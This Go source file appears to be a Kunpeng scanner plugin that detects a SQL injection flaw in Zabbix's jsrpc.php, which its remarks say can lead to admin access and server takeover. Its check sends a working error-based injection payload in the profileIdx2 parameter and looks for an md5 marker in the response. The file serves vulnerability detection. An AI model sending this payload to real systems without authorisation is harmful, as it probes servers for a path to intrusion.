package goplugin

import (
	"net/http"
	"strings"
	"github.com/opensec-cn/kunpeng/util"
	"github.com/opensec-cn/kunpeng/plugin"
)

type zabbixJsrpcSQL struct {
	info   plugin.PluginInfo
	result []plugin.PluginInfo
}

func init() {
	plugin.Regist("zabbix", &zabbixJsrpcSQL{})
}
func (d *zabbixJsrpcSQL) Init() plugin.PluginInfo{
	d.info = plugin.PluginInfo{
		Name:    "Zabbix jsrpc.php SQL注入漏洞",
		Remarks: "影响版本：v2.2.x, 3.0.0-3.0.3，攻击者通过此漏洞可获取管理员权限登陆后台，由于后台存在执行命令功能，可导致服务器被入侵控制",
		Level:   1,
		Type:    "SQL",
		Author:   "wolf",
        References: plugin.References{
        	URL: "",
        	CVE: "",
        },
	}
	return d.info
}
func (d *zabbixJsrpcSQL) GetResult() []plugin.PluginInfo {
	return d.result
}
func (d *zabbixJsrpcSQL) Check(URL string, meta plugin.TaskMeta) bool {
	poc := "/jsrpc.php?type=9&method=screen.get&timestamp=1471403798083&pageFile=history.php&profileIdx=web.item.graph&profileIdx2=1+or+updatexml(1,md5(0x36),1)+or+1=1)%23&updateProfile=true&period=3600&stime=20160817050632&resourcetype=17"
	request, err := http.NewRequest("GET", URL+poc, nil)
	if err != nil {
		return false
	}
	resp, err := util.RequestDo(request, true)
	if err != nil {
		return false
	}
	if strings.Contains(resp.ResponseRaw, "c5a880faf6fb5e6087eb1b2dc") {
		result := d.info
		result.Response = resp.ResponseRaw
		result.Request = resp.RequestRaw
		d.result = append(d.result, result)
		return true
	}
	return false
}
